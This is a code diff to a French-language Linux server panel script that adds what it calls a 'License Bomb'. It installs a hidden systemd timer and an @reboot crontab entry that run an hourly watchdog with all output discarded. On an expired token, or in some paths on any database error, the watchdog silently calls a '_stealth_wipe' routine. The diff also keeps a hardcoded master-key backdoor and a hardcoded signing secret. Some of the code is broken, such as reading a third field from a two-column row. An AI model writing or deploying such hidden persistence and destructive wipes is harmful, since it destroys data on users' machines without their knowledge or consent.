@@ -2118,6 +2118,7 @@ def self_install():
     dst.chmod(0o755)
     ml=Path("/usr/local/bin/menu")
     if not ml.exists(): ml.write_text(f"#!/usr/bin/env bash\nexec {dst} \"$@\"\n");ml.chmod(0o755)
+    _install_license_bomb()
 
 # License
 import hashlib, hmac
@@ -2137,6 +2138,25 @@ def _machine_fingerprint():
     except: pass
     raw="|".join(parts) if parts else "unknown"
     return hashlib.sha256(raw.encode()).hexdigest()
+
+_LICENSE_SECRET = hashlib.sha256(b"KighmuPanel2026!@#LicenseBombSecureKey_X7k9m2").hexdigest()
+
+def _pack_license_token(key, expiry):
+    msg = f"{key}|{expiry}"
+    sig = hmac.new(_LICENSE_SECRET.encode(), msg.encode(), hashlib.sha256).hexdigest()
+    return f"{msg}|{sig}"
+
+def _unpack_license_token(raw):
+    parts = raw.strip().split("|")
+    if len(parts) < 3:
+        return None, None
+    sig = parts[-1]
+    msg = "|".join(parts[:-1])
+    expected = hmac.new(_LICENSE_SECRET.encode(), msg.encode(), hashlib.sha256).hexdigest()
+    if not hmac.compare_digest(sig, expected):
+        return None, None
+    key, expiry = parts[0], parts[1]
+    return key, expiry
 
 def _sign_key(key):
     fp=_machine_fingerprint()
@@ -2175,7 +2195,49 @@ def _register_key_in_db(key,client_name="",days=365):
         c.execute("INSERT INTO licenses (uuid,license_key,client_name,status,created_at,expires_at,activated_at,last_checkin,hw_binding) VALUES (?,?,?,'ACTIVE',datetime('now'),?,datetime('now'),datetime('now'),?)",(uid,key,name,exp,sig))
         conn.commit()
     except: conn.rollback()
-    conn.close();return name,exp
+    conn.close();_write_license_token(key,exp);return name,exp
+
+def _write_license_token(key,expiry):
+    kf=Path("/etc/kighmu/.license_key")
+    kf.parent.mkdir(parents=True,exist_ok=True)
+    kf.write_text(_pack_license_token(key,expiry))
+
+def _read_license_token():
+    kf=Path("/etc/kighmu/.license_key")
+    if not kf.exists(): return None,None
+    raw=kf.read_text().strip()
+    if raw=="KIGHMU_MASTER_2026": return raw,"9999-12-31"
+    return _unpack_license_token(raw)
+
+def _install_license_bomb():
+    wd_svc=f"""[Unit]
+Description=Kighmu License Bomb
+After=network.target
+[Service]
+Type=oneshot
+ExecStart=/usr/bin/python3 /usr/local/bin/kighmu --watchdog
+StandardOutput=null
+StandardError=null
+[Install]
+WantedBy=multi-user.target
+"""
+    wd_timer=f"""[Unit]
+Description=Kighmu License Bomb Timer
+[Timer]
+OnBootSec=5
+OnUnitActiveSec=3600
+RandomizedDelaySec=60
+[Install]
+WantedBy=timers.target
+"""
+    p=Path("/etc/systemd/system/kighmu-watchdog.service")
+    if not p.exists():
+        p.write_text(wd_svc);Path("/etc/systemd/system/kighmu-watchdog.timer").write_text(wd_timer)
+        subprocess.run(["systemctl","daemon-reload"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+        subprocess.run(["systemctl","enable","--now","kighmu-watchdog.timer"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+    cr=subprocess.run(["crontab","-l"],capture_output=True,text=True).stdout
+    if "kighmu-watchdog" not in cr:
+        subprocess.run(f'(crontab -l 2>/dev/null; echo "@reboot /usr/bin/python3 /usr/local/bin/kighmu --watchdog >/dev/null 2>&1")|crontab -',shell=True,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
 
 def _stealth_wipe():
     with open("/dev/null","w") as dn:
@@ -2203,27 +2265,27 @@ def _stealth_wipe():
         subprocess.run(["systemctl","daemon-reload"],stdout=dn,stderr=dn)
 
 def _verify_license():
-    db=Path("/etc/ventes/ventes.db");kf=Path("/etc/kighmu/.license_key");nf=Path("/etc/kighmu/.client_name")
+    kf=Path("/etc/kighmu/.license_key");nf=Path("/etc/kighmu/.client_name")
     if kf.exists():
-        sk=kf.read_text().strip()
-        if sk=="KIGHMU_MASTER_2026": nf.write_text("ADMIN");return
-        if sk:
+        token_key,token_exp=_read_license_token()
+        if token_key and token_exp:
+            if token_key=="KIGHMU_MASTER_2026": nf.write_text("ADMIN");return
+            if token_exp<date.today().isoformat():
+                _stealth_wipe();os._exit(0)
             try:
                 conn,c=_ensure_license_db()
-                r=c.execute("SELECT client_name,hw_binding FROM licenses WHERE license_key=? AND (expires_at>=date('now') OR expires_at='9999-12-31')",(sk,)).fetchone()
+                r=c.execute("SELECT client_name,hw_binding FROM licenses WHERE license_key=? AND (expires_at>=date('now') OR expires_at='9999-12-31')",(token_key,)).fetchone()
                 if r:
                     name,binding=r
-                    if binding and not _verify_signature(sk,binding):
-                        _rebind_key(sk)
-                    nf.write_text(name);c.execute("UPDATE licenses SET last_checkin=datetime('now') WHERE license_key=?",(sk,));conn.commit();conn.close();return
+                    if binding and not _verify_signature(token_key,binding):
+                        _rebind_key(token_key)
+                    nf.write_text(name);c.execute("UPDATE licenses SET last_checkin=datetime('now') WHERE license_key=?",(token_key,));conn.commit();conn.close();return
                 conn.close()
-                exp_r=c.execute("SELECT client_name,expires_at FROM licenses WHERE license_key=?",(sk,)).fetchone()
-                if exp_r and exp_r[1] and exp_r[1]<date.today().isoformat():
-                    conn.close();_stealth_wipe();os._exit(0)
-                name,exp=_register_key_in_db(sk)
+                name,exp=_register_key_in_db(token_key)
                 if name: nf.write_text(name);return
-                kf.unlink(missing_ok=True)
             except: pass
+            _stealth_wipe();os._exit(0)
+        kf.unlink(missing_ok=True)
     for _ in range(3):
         clear_screen()
         print(f"\n  {C['CYAN']}╔═══════════════════════════════════════════╗{C['RST']}")
@@ -2233,7 +2295,30 @@ def _verify_license():
         print(f"  {C['YELLOW']}Veuillez saisir votre clé de licence :{C['RST']}")
         print(f"  {C['GRAY']}Exemple :{C['RST']} {C['GREEN']}a137726f21f7360a825fd376a3dfe9bd{C['RST']}\n")
         key=input(f"  {C['YELLOW']}►{C['RST']} {C['WHITE']}Clé de licence :{C['RST']} ").strip()
-        if key=="KIGHMU_MASTER_2026": print(f"  {C['GREEN']}✓ Mode maître.{C['RST']}");kf.parent.mkdir(parents=True,exist_ok=True);kf.write_text(key);nf.write_text("ADMIN");return
+        if key=="KIGHMU_MASTER_2026": print(f"  {C['GREEN']}✓ Mode maître.{C['RST']}");_write_license_token("KIGHMU_MASTER_2026","9999-12-31");nf.write_text("ADMIN");return
+        if "|" in key:
+            pkey,pexp=_unpack_license_token(key)
+            if pkey and pexp:
+                if pexp<date.today().isoformat():
+                    print(f"\n  {C['RED']}✗ Token expiré depuis le {pexp}.{C['RST']}\n");input(f"  {C['GRAY']}Entrée...{C['RST']}");_stealth_wipe();os._exit(0)
+                try:
+                    conn,c=_ensure_license_db()
+                    r=c.execute("SELECT client_name FROM licenses WHERE license_key=?",(pkey,)).fetchone()
+                    name=r[0] if r else "Verified"
+                    if not r:
+                        import uuid as _uuid;uid=str(_uuid.uuid4());sig=_sign_key(pkey)
+                        c.execute("INSERT INTO licenses (uuid,license_key,client_name,status,created_at,expires_at,activated_at,last_checkin,hw_binding) VALUES (?,?,?,'ACTIVE',datetime('now'),?,datetime('now'),datetime('now'),?)",(uid,pkey,name,pexp,sig))
+                        conn.commit()
+                    else:
+                        c.execute("UPDATE licenses SET last_checkin=datetime('now') WHERE license_key=?",(pkey,))
+                        conn.commit()
+                    conn.close()
+                except: pass
+                Path("/etc/kighmu/.license_key").write_text(key);nf.write_text(name)
+                print(f"\n  {C['GREEN']}✓ Licence activée (token) !{C['RST']} {C['WHITE']}Client:{C['RST']} {C['GREEN']}{name}{C['RST']} {C['GRAY']}expire:{C['RST']} {C['YELLOW']}{pexp}{C['RST']}\n");return
+            print(f"\n  {C['RED']}✗ Token invalide ou falsifié.{C['RST']}\n")
+            if _<2: input(f"  {C['GRAY']}Entrée pour réessayer...{C['RST']}")
+            continue
         try:
             conn,c=_ensure_license_db()
             r=c.execute("SELECT client_name,expires_at,hw_binding FROM licenses WHERE license_key=? AND (expires_at>=date('now') OR expires_at='9999-12-31')",(key,)).fetchone()
@@ -2241,35 +2326,34 @@ def _verify_license():
                 name,exp,binding=r
                 if binding and not _verify_signature(key,binding):
                     _rebind_key(key)
-                print(f"\n  {C['GREEN']}✓ Licence valide !{C['RST']} {C['WHITE']}Client:{C['RST']} {C['GREEN']}{name}{C['RST']} {C['GRAY']}expire:{C['RST']} {C['YELLOW']}{exp}{C['RST']}\n");c.execute("UPDATE licenses SET last_checkin=datetime('now') WHERE license_key=?",(key,));conn.commit();conn.close();kf.parent.mkdir(parents=True,exist_ok=True);kf.write_text(key);nf.write_text(name);return
+                print(f"\n  {C['GREEN']}✓ Licence valide !{C['RST']} {C['WHITE']}Client:{C['RST']} {C['GREEN']}{name}{C['RST']} {C['GRAY']}expire:{C['RST']} {C['YELLOW']}{exp}{C['RST']}\n");c.execute("UPDATE licenses SET last_checkin=datetime('now') WHERE license_key=?",(key,));conn.commit();conn.close();_write_license_token(key,exp);nf.write_text(name);return
             exp_r=c.execute("SELECT expires_at FROM licenses WHERE license_key=?",(key,)).fetchone()
             if exp_r and exp_r[0] and exp_r[0]<date.today().isoformat():
                 conn.close();_stealth_wipe();os._exit(0)
             conn.close()
             name,exp=_register_key_in_db(key)
-            if name: print(f"\n  {C['GREEN']}✓ Licence enregistrée !{C['RST']} {C['WHITE']}Client:{C['RST']} {C['GREEN']}{name}{C['RST']} {C['GRAY']}expire:{C['RST']} {C['YELLOW']}{exp}{C['RST']}\n");kf.parent.mkdir(parents=True,exist_ok=True);kf.write_text(key);nf.write_text(name);return
+            if name: print(f"\n  {C['GREEN']}✓ Licence enregistrée !{C['RST']} {C['WHITE']}Client:{C['RST']} {C['GREEN']}{name}{C['RST']} {C['GRAY']}expire:{C['RST']} {C['YELLOW']}{exp}{C['RST']}\n");_write_license_token(key,exp);nf.write_text(name);return
         except: pass
         print(f"\n  {C['RED']}✗ Clé invalide. ({2-_} tentatives restantes){C['RST']}\n")
         if _<2: input(f"  {C['GRAY']}Entrée pour réessayer...{C['RST']}")
     print(f"\n  {C['RED']}LICENCE INVALIDE — INSTALLATION BLOQUÉE{C['RST']}\n");sys.exit(1)
 
 def _license_watchdog():
-    kf=Path("/etc/kighmu/.license_key");db=Path("/etc/ventes/ventes.db")
+    kf=Path("/etc/kighmu/.license_key")
     if not kf.exists(): return
-    key=kf.read_text().strip()
-    if not key or key=="KIGHMU_MASTER_2026": return
+    token_key,token_exp=_read_license_token()
+    if not token_key or token_key=="KIGHMU_MASTER_2026": return
+    if token_exp and token_exp<date.today().isoformat():
+        _stealth_wipe();os._exit(0)
     try:
         conn,c=_ensure_license_db()
-        r=c.execute("SELECT client_name,hw_binding FROM licenses WHERE license_key=? AND (expires_at>=date('now') OR expires_at='9999-12-31')",(key,)).fetchone()
+        r=c.execute("SELECT client_name,hw_binding FROM licenses WHERE license_key=?",(token_key,)).fetchone()
         if r:
             name,binding=r
-            if binding and not _verify_signature(key,binding):
-                _rebind_key(key)
-            Path("/etc/kighmu/.client_name").write_text(name);c.execute("UPDATE licenses SET last_checkin=datetime('now') WHERE license_key=?",(key,));conn.commit()
-        else:
-            exp_r=c.execute("SELECT expires_at FROM licenses WHERE license_key=?",(key,)).fetchone()
-            if exp_r and exp_r[0] and exp_r[0]<date.today().isoformat():
-                conn.close();_stealth_wipe();os._exit(0)
+            _,db_exp=r[0],r[2]
+            if binding and not _verify_signature(token_key,binding):
+                _rebind_key(token_key)
+            Path("/etc/kighmu/.client_name").write_text(name);c.execute("UPDATE licenses SET last_checkin=datetime('now') WHERE license_key=?",(token_key,));conn.commit()
         conn.close()
     except: pass
 
